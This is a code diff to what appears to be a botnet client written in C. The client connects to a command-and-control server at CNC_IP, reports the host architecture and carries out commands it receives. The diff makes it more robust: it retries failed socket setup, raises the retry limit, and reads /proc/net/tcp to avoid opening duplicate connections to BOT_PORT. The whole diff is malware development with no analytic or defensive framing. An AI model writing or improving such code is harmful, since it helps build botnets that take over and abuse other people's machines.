@@ -208,21 +208,47 @@ int main(int argc, char** argv) {
     inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);
 
     int attempts = 0;
-    while (attempts < 13) {
+    while (attempts < 15) {
+        FILE *fp = fopen("/proc/net/tcp", "r");
+        if (fp) {
+            char line[512];
+            int found = 0;
+            fgets(line, sizeof(line), fp);
+            while (fgets(line, sizeof(line), fp)) {
+                unsigned int local_port, rem_port;
+                if (sscanf(line, "%*d: %*x:%x %*x:%x %*x %*x:%*x %*x:%*x %*x %*d %*d %*d", &local_port, &rem_port) == 2) {
+                    if (rem_port == BOT_PORT) {
+                        found = 1;
+                        break;
+                    }
+                }
+            }
+            fclose(fp);
+            if (found) {
+                return 0; // Anti socket spam
+            }
+        }
+
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock < 0) {
-            return 1;
+            attempts++;
+            sleep(5);
+            continue;
         }
 
         int optval = 1;
         if (setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0) {
             close(sock);
-            return 1;
+            attempts++;
+            sleep(5);
+            continue;
         }
 
         if (setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval)) < 0) {
             close(sock);
-            return 1;
+            attempts++;
+            sleep(5);
+            continue;
         }
 
         if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
@@ -234,8 +260,6 @@ int main(int argc, char** argv) {
 
         const char* arch = get_arch();
         send(sock, arch, strlen(arch), 0);
-
-        attempts = 0;
 
         char buffer[1024];
         while (1) {
@@ -259,6 +283,7 @@ int main(int argc, char** argv) {
             }
             handle_command(buffer, sock);
         }
+        attempts++;
     }
 
     close(sock);
